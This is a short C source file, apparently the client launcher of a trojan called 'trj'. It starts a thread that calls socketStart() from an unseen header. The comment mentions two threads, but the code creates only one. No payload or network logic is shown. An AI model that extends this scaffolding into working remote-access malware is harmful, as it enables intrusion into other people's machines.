#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include "trojan.h"

void *startTrojan(void *args)
{
  printf("[T]: Starting the trojan\n");
  socketStart();
}

int main() 
{
  /*
   * This is the entry point for the client side of
   * the trj trojan, it's main purpose is to create 
   * two threads 
   *
   *  - One for running the trojan
   *  - Another for running ntrj code
   */
  pthread_t th1;
  printf("[C]: Creating threads for tr & ntrj...\n");
  // Create both threads (&th1, &th2) and start them
  pthread_create(&th1, NULL, startTrojan, NULL);
  pthread_join(th1, NULL);
  printf("[C]: ENDED");
  return 0;
}
